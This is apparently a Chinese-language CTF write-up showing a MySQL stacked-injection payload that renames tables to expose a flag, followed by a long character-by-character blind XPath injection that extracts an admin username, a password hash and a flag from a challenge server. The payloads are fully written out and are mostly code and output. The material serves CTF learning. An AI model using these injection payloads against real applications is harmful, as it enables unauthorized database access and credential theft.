https://www.nps.ink/398194.html
使用mysql堆叠注入
根据两个表的查询可以知道，查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id，所以默认的查询是words
骚姿势
1.将words表改名为word1或其它任意名字
2.1919810931114514改名为words
3.将新的word表,flag列改名为id
他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字。
先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。

http://220.249.52.133:40492/?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;--+

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

永真查询可以查出flag
http://220.249.52.133:40492/?inject=1' or '1'='1

array(1) {
  [0]=>
  string(38) "flag{c168d583ed0d4d7196967b28cbd0b5e9}"
}

```







xpath注入

https://xz.aliyun.com/t/7791#toc-6





从根节点开始判断：

```
'or count(/)=1  or ''='     ###根节点数量为1
'or count(/*)=1 or ''='   ##根节点下只有一个子节点
```

判断根节点下的节点长度为8：

```
'or string-length(name(/*[1]))=8 or ''='
```

猜解根节点下的节点名称：

```
'or substring(name(/*[1]), 1, 1)='a'  or ''='
'or substring(name(/*[1]), 2, 1)='c'  or ''='
..
'or substring(name(/*[1]), 8, 1)='s'  or ''='
```



猜解出该节点名称为accounts

```
'or count(/accounts)=1  or ''='   /accounts节点数量为1
'or count(/accounts/user/*)>0 or ''='     /accounts下有两个节点

'or string-length(name(/accounts/*[1]))=4  or ''='    第一个子节点长度为4
```

猜解accounts下的节点名称：

```
'or substring(name(/accounts/*[1]), 1, 1)='u'  or ''='
...
'or substring(name(/accounts/*[1]), 4, 1)='r'  or ''='
```

accounts下子节点名称为user

```
'or count(/accounts/user)=2  or ''='    user节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为user节点
```

第一个user节点的子节点长度为8：
'or string-length(name(/accounts/user[position()=1]/*[1]))=8 or ''='

读取user节点的下子节点

```
'or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)='u'  or ''='
'or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)='s'  or ''='
...
'or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)='e'  or ''='
```

最终所有子节点值验证如下：

```
'or substring(name(/accounts/user[position()=1]/*[1]), 1)='username'  or ''='
'or substring(name(/accounts/user[position()=1]/*[2]), 1)='email'  or ''='
'or substring(name(/accounts/user[position()=1]/*[3]), 1)='accounttype'  or ''='
'or substring(name(/accounts/user[position()=1]/*[4]), 1)='password'  or ''='
```

继续猜解：

```
'or count(/accounts/user[position()=1]/username/*)>0 or ''='   
'or count(/accounts/user[position()=1]/email/*)>0 or ''=' 
'or count(/accounts/user[position()=1]/accounttype/*)>0 or ''='
'or count(/accounts/user[position()=1]/username/password/*)>0 or ''='
```

均为 false，不再有子节点，则可以尝试读取这些节点的值

第一个user下的username值长度为6:

```
'or string-length((//user[position()=1]/username[position()=1]))=6  or ''='
```

读取第一个user下usernaem的值

```
'or substring((//user[position()=1]/username[position()=1]),1,1)='T'  or ''='
....
'or substring((//user[position()=1]/username[position()=1]),6,1)='e'  or ''='
```

可依次读取所有的子节点的值，第二user节点的子节点值读取方式：

```
'or string-length((//user[position()=2]/username[position()=1]))=4 or ''='  第一个user下的username长度为4
......
```

重复上边步骤即可



------

### HECTF injection

```
判断根节点下只有一个子节点

判断根节点下的节点长度为4
http://114.55.165.246:8082/?username='or+string-length(name(/*[1]))=4+or+''='&password=asd&submit=ç»å½
```



 猜解根节点下的节点名称： 

```
长度第一位为r
username='or substring(name(/*[1]), 1, 1)='r'  or ''='&password=123&submit=ç»å½
长度第一位为o
username='or substring(name(/*[1]), 2, 1)='o'  or ''='&password=123&submit=ç»å½
长度第一位为o
username='or substring(name(/*[1]), 1, 1)='o'  or ''='&password=123&submit=ç»å½
长度第一位为t
username='or substring(name(/*[1]), 1, 1)='t'  or ''='&password=123&submit=ç»å½
得到root
```





```
/root节点数量为1
/?username='or count(/root)=1  or ''='&password=123&submit=ç»å½


第一个子节点长度为5
/?username='or string-length(name(/root/*[1]))=5  or ''='&password=123&submit=ç»å½


猜解root下节点名称
u
/?username='or substring(name(/root/*[1]), 1, 1)='u'  or ''='&password=123&submit=ç»å½
s
/?username='or substring(name(/root/*[1]), 2, 1)='s'  or ''='&password=123&submit=ç»å½
e
/?username='or substring(name(/root/*[1]), 1, 1)='e'  or ''='&password=123&submit=ç»å½
r
/?username='or substring(name(/root/*[1]), 2, 1)='r'  or ''='&password=123&submit=ç»å½
s
/?username='or substring(name(/root/*[1]), 1, 1)='s'  or ''='&password=123&submit=ç»å½
得到结果为users
```





```
users节点有1个
猜出root节点结构下,root有1个节点,为users
/?username='or count(/root/users)=1  or ''='&password=123&submit=ç»å½


第一个users节点的子节点长度为4
/?username='or string-length(name(/root/users[position()=1]/*[1]))=4 or ''='&password=123&submit=ç»å½


u
/?username='or substring(name(/root/users[position()=1]/*[1]), 1, 1)='u'  or ''='&password=123&submit=ç»å½
s
/?username='or substring(name(/root/users[position()=1]/*[1]), 2, 1)='s'  or ''='&password=123&submit=ç»å½
e
/?username='or substring(name(/root/users[position()=1]/*[1]), 3, 1)='e'  or ''='&password=123&submit=ç»å½
r
/?username='or substring(name(/root/users[position()=1]/*[1]), 4, 1)='r'  or ''='&password=123&submit=ç»å½
得到节点值user

显示登录成功说明验证成功
/?username='or substring(name(/root/users[position()=1]/*[1]), 1)='user'  or ''='&password=123&submit=ç»å½







下面有10个子节点 崩溃了
/?username='or count(/root/users[position()=1]/user/*)<10 or ''='  &password=123&submit=ç»å½





```





```
users/user节点有3个
/?username='or count(/root/users/user)=3  or ''='&password=123&submit=ç»å½


第一个users/user的长度为2
/?username='or string-length(name(/root/users/user[position()=1]/*[1]))=2 or ''='&password=123&submit=ç»å½
第二个users/user的长度为8
/?username='or string-length(name(/root/users/user[position()=1]/*[2]))=8 or ''='&password=123&submit=ç»å½
第三个users/user的长度为8
/?username='or string-length(name(/root/users/user[position()=1]/*[3]))=8 or ''='&password=123&submit=ç»å½


i
/?username='or substring(name(/root/users[position()=1]/*[1]), 1, 1)='i'  or ''='&password=123&submit=ç»å½
d
/?username='or substring(name(/root/users[position()=1]/*[1]), 2, 1)='d'  or ''='&password=123&submit=ç»å½
第一个节点id

u
/?username='or substring(name(/root/users[position()=1]/*[2]), 1, 1)='u'  or ''='&password=123&submit=ç»å½
s
/?username='or substring(name(/root/users[position()=1]/*[2]), 2, 1)='s'  or ''='&password=123&submit=ç»å½
e
/?username='or substring(name(/root/users[position()=1]/*[2]), 3, 1)='s'  or ''='&password=123&submit=ç»å½
r
/?username='or substring(name(/root/users[position()=1]/*[2]), 4, 1)='s'  or ''='&password=123&submit=ç»å½
n
/?username='or substring(name(/root/users[position()=1]/*[2]), 5, 1)='n'  or ''='&password=123&submit=ç»å½
a
/?username='or substring(name(/root/users[position()=1]/*[2]), 6, 1)='a'  or ''='&password=123&submit=ç»å½
m
/?username='or substring(name(/root/users[position()=1]/*[2]), 7, 1)='m'  or ''='&password=123&submit=ç»å½
e
/?username='or substring(name(/root/users[position()=1]/*[2]), 8, 1)='e'  or ''='&password=123&submit=ç»å½
第二个节点username

p
/?username='or substring(name(/root/users[position()=1]/*[3]), 1, 1)='p'  or ''='&password=123&submit=ç»å½
a
/?username='or substring(name(/root/users[position()=1]/*[3]), 2, 1)='a'  or ''='&password=123&submit=ç»å½
s
/?username='or substring(name(/root/users[position()=1]/*[3]), 3, 1)='s'  or ''='&password=123&submit=ç»å½
s
/?username='or substring(name(/root/users[position()=1]/*[3]), 4, 1)='s'  or ''='&password=123&submit=ç»å½
w
/?username='or substring(name(/root/users[position()=1]/*[3]), 5, 1)='w'  or ''='&password=123&submit=ç»å½
o
/?username='or substring(name(/root/users[position()=1]/*[3]), 6, 1)='o'  or ''='&password=123&submit=ç»å½
r
/?username='or substring(name(/root/users[position()=1]/*[3]), 7, 1)='r'  or ''='&password=123&submit=ç»å½
d
/?username='or substring(name(/root/users[position()=1]/*[3]), 8, 1)='d'  or ''='&password=123&submit=ç»å½
第三个节点password




id没有子节点了
/?username='or count(/root/users/user[position()=1]/id/*)=0 or ''='  &password=123&submit=ç»å½
username没有子节点了
/?username='or count(/root/users/user[position()=1]/username/*)=0 or ''='  &password=123&submit=ç»å½
password没有子节点了
/?username='or count(/root/users/user[position()=1]/password/*)=0 or ''='  &password=123&submit=ç»å½

芜湖开心


user下的id值长度为1
/?username='or string-length((//user[position()=1]/id[position()=1]))=1  or ''='&password=123&submit=ç»å½
user下的username值长度为5
/?username='or string-length((//user[position()=1]/username[position()=1]))=5  or ''='&password=123&submit=ç»å½
user下的password值长度为32
/?username='or string-length((//user[position()=1]/password[position()=1]))=32  or ''='&password=123&submit=ç»å½




user下username的值
a
/?username='or substring((//user[position()=1]/username[position()=1]),1,1)='a'  or ''='&password=123&submit=ç»å½
d
/?username='or substring((//user[position()=1]/username[position()=1]),2,1)='d'  or ''='&password=123&submit=ç»å½
m
/?username='or substring((//user[position()=1]/username[position()=1]),3,1)='m'  or ''='&password=123&submit=ç»å½
i
/?username='or substring((//user[position()=1]/username[position()=1]),4,1)='i'  or ''='&password=123&submit=ç»å½
n
/?username='or substring((//user[position()=1]/username[position()=1]),5,1)='n'  or ''='&password=123&submit=ç»å½
admin


user下password的值
3
/?username='or substring((//user[position()=1]/password[position()=1]),1,1)='3'  or ''='&password=123&submit=ç»å½
3
/?username='or substring((//user[position()=1]/password[position()=1]),2,1)='3'  or ''='&password=123&submit=ç»å½
9
/?username='or substring((//user[position()=1]/password[position()=1]),3,1)='9'  or ''='&password=123&submit=ç»å½
d
/?username='or substring((//user[position()=1]/password[position()=1]),4,1)='d'  or ''='&password=123&submit=ç»å½
b
/?username='or substring((//user[position()=1]/password[position()=1]),5,1)='b'  or ''='&password=123&submit=ç»å½
7
/?username='or substring((//user[position()=1]/password[position()=1]),6,1)='7'  or ''='&password=123&submit=ç»å½
1
/?username='or substring((//user[position()=1]/password[position()=1]),7,1)='1'  or ''='&password=123&submit=ç»å½
4
/?username='or substring((//user[position()=1]/password[position()=1]),8,1)='4'  or ''='&password=123&submit=ç»å½
6
/?username='or substring((//user[position()=1]/password[position()=1]),9,1)='6'  or ''='&password=123&submit=ç»å½
4
/?username='or substring((//user[position()=1]/password[position()=1]),10,1)='4'  or ''='&password=123&submit=ç»å½
7
/?username='or substring((//user[position()=1]/password[position()=1]),11,1)='7'  or ''='&password=123&submit=ç»å½
a
/?username='or substring((//user[position()=1]/password[position()=1]),12,1)='a'  or ''='&password=123&submit=ç»å½
1
/?username='or substring((//user[position()=1]/password[position()=1]),13,1)='1'  or ''='&password=123&submit=ç»å½
d
/?username='or substring((//user[position()=1]/password[position()=1]),14,1)='d'  or ''='&password=123&submit=ç»å½
6
/?username='or substring((//user[position()=1]/password[position()=1]),15,1)='6'  or ''='&password=123&submit=ç»å½
6
/?username='or substring((//user[position()=1]/password[position()=1]),16,1)='6'  or ''='&password=123&submit=ç»å½
b
/?username='or substring((//user[position()=1]/password[position()=1]),17,1)='b'  or ''='&password=123&submit=ç»å½
8
/?username='or substring((//user[position()=1]/password[position()=1]),18,1)='8'  or ''='&password=123&submit=ç»å½
5
/?username='or substring((//user[position()=1]/password[position()=1]),19,1)='5'  or ''='&password=123&submit=ç»å½
c
/?username='or substring((//user[position()=1]/password[position()=1]),20,1)='c'  or ''='&password=123&submit=ç»å½
d
/?username='or substring((//user[position()=1]/password[position()=1]),21,1)='d'  or ''='&password=123&submit=ç»å½
0
/?username='or substring((//user[position()=1]/password[position()=1]),22,1)='0'  or ''='&password=123&submit=ç»å½
8
/?username='or substring((//user[position()=1]/password[position()=1]),23,1)='8'  or ''='&password=123&submit=ç»å½
4
/?username='or substring((//user[position()=1]/password[position()=1]),24,1)='4'  or ''='&password=123&submit=ç»å½
4
/?username='or substring((//user[position()=1]/password[position()=1]),25,1)='4'  or ''='&password=123&submit=ç»å½
2
/?username='or substring((//user[position()=1]/password[position()=1]),26,1)='2'  or ''='&password=123&submit=ç»å½
2
/?username='or substring((//user[position()=1]/password[position()=1]),27,1)='2'  or ''='&password=123&submit=ç»å½
8
/?username='or substring((//user[position()=1]/password[position()=1]),28,1)='8'  or ''='&password=123&submit=ç»å½
7
/?username='or substring((//user[position()=1]/password[position()=1]),29,1)='7'  or ''='&password=123&submit=ç»å½
8
/?username='or substring((//user[position()=1]/password[position()=1]),30,1)='8'  or ''='&password=123&submit=ç»å½
4
/?username='or substring((//user[position()=1]/password[position()=1]),31,1)='4'  or ''='&password=123&submit=ç»å½
1
/?username='or substring((//user[position()=1]/password[position()=1]),32,1)='1'  or ''='&password=123&submit=ç»å½
339db714647a1d66b85cd08442287841

admin
339db714647a1d66b85cd08442287841 登录成功
登录成功you login as adminflag{53142eb4-d227-47e4-a7e7-902f7359a079}
```







